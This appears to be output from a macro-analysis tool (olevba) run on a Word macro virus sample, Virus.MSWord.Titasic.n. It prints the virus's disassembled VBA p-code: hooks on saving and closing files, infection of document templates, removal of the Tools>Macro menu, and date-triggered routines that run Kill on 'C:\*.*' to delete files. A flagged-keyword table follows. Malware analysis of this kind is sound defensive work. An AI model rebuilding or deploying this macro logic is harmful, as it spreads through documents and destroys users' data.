' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0018 "\Professional Letter.dot"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	ArgsMemCallWith SaveAs 0x0003 
' Line #167:
' 	EndWith 
' Line #168:
' 	EndIfBlock 
' Line #169:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #170:
' 	Label batal 
' Line #171:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall disableautomacros 0x0001 
' Line #172:
' 	EndSub 
' Line #173:
' 	FuncDefn (Function Err())
' Line #174:
' 	OnError (Resume Next) 
' Line #175:
' 	Ld Now 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Gt 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Error 
' 	EndIf 
' Line #176:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo AksiA 
' 	EndIf 
' Line #177:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo AksiA 
' 	EndIf 
' Line #178:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo AksiA 
' 	EndIf 
' Line #179:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo AksiA 
' 	EndIf 
' Line #180:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo AksiA 
' 	EndIf 
' Line #181:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo AksiA 
' 	EndIf 
' Line #182:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo AksiA 
' 	EndIf 
' Line #183:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo AksiA 
' 	EndIf 
' Line #184:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo AksiA 
' 	EndIf 
' Line #185:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo AksiB 
' 	EndIf 
' Line #186:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo AksiA 
' 	EndIf 
' Line #187:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo AksiA 
' 	EndIf 
' Line #188:
' 	GoTo EndAksi 
' Line #189:
' 	Label Error 
' Line #190:
' 	GoTo EndAksi 
' Line #191:
' 	Label AksiA 
' Line #192:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Gbr 0x0000 
' 	EndIf 
' Line #193:
' 	Label AksiB 
' Line #194:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Pas 0x0000 
' 	EndIf 
' Line #195:
' 	Label EndAksi 
' Line #196:
' 	End 
' Line #197:
' 	EndFunc 
' Line #198:
' 	FuncDefn (Sub ToolsMacro())
' Line #199:
' 	OnError (Resume Next) 
' Line #200:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #201:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #202:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall disableautomacros 0x0001 
' Line #203:
' 	Ld ActiveDocument 
' 	ArgsCall BMM1 0x0001 
' Line #204:
' 	EndSub 
' Line #205:
' 	FuncDefn (Sub ToolsOptions())
' Line #206:
' 	LineCont 0x0004 07 00 08 00
' 	LitStr 0x002B "C:\Program Files\Microsoft Office\Templates"
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #207:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #208:
' 	LineCont 0x0004 07 00 14 00
' 	Ld Application 
' 	MemLd Path 
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #209:
' 	EndSub 
' Line #210:
' 	FuncDefn (Function Asm())
' Line #211:
' 	LitVarSpecial (True)
' 	St reset 
' Line #212:
' 	ArgsCall FileTemplates 0x0000 
' Line #213:
' 	Ld lanjutan 
' 	ArgsCall BMM1 0x0001 
' Line #214:
' 	EndFunc 
' Line #215:
' 	FuncDefn (Sub FileTemplates())
' Line #216:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall disableautomacros 0x0001 
' Line #217:
' 	Ld reset 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0057 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Display 0x0000 
' 	EndIf 
' Line #218:
' 	EndSub 
' Line #219:
' 	FuncDefn (Function Init())
' Line #220:
' 	Ld hack 
' 	ArgsMemCall Show 0x0000 
' Line #221:
' 	EndFunc 
' Line #222:
' 	FuncDefn (Sub FileExit())
' Line #223:
' 	ArgsCall AutoExit 0x0000 
' Line #224:
' 	EndSub 
' Line #225:
' 	FuncDefn (Sub FileSave())
' Line #226:
' 	ArgsCall AutoSave 0x0000 
' Line #227:
' 	EndSub 
' Line #228:
' 	FuncDefn (Sub FileClose())
' Line #229:
' 	ArgsCall AutoClose 0x0000 
' Line #230:
' 	EndSub 
' Line #231:
' 	FuncDefn (Function Pas())
' Line #232:
' 	LitStr 0x002B "Don't let our differences come between us. "
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	MemLd New 
' 	Concat 
' 	Ld vbOKOnly 
' 	Ld vbSystemModal 
' 	Add 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #233:
' 	ArgsCall Dat 0x0000 
' Line #234:
' 	ArgsCall Init 0x0000 
' Line #235:
' 	LitStr 0x0006 "C:\*.*"
' 	ArgsCall Kill 0x0001 
' Line #236:
' 	EndFunc 
' Line #237:
' 	FuncDefn (Function Gbr())
' Line #238:
' 	LitStr 0x001C "He came out with a new play."
' 	Ld vbOKOnly 
' 	Ld vbSystemModal 
' 	Add 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #239:
' 	ArgsCall Dat 0x0000 
' Line #240:
' 	ArgsCall Init 0x0000 
' Line #241:
' 	LitStr 0x0006 "C:\*.*"
' 	ArgsCall Kill 0x0001 
' Line #242:
' 	EndFunc 
' Macros/VBA/hack - 1757 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Line #38:
' Line #39:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #40:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #41:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Welcome 3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MSOD
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
There's no getting away from 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
IfT� 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Virus Macro "99"�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
People can sey what they like, If you don't like it, 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
You cant leave it !
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I don't know what to make of this ?
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
and �
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�IFTA{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�MailCity�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.Com{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS�H
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ift� 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS�H
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Virus
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS�H
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Macro
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS�H
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Exit�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame3'" IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame2'" IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label6'" IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label7'" IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label8'" IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label9'" IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label10'" IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label11'" IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label12'" IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label13'" IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label14'" IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label15'" IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label16'" IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN './Virus.MSWord.Titasic.n' - OLE stream: 'Macros/hack/i05/i01/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Bacalah.bat         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

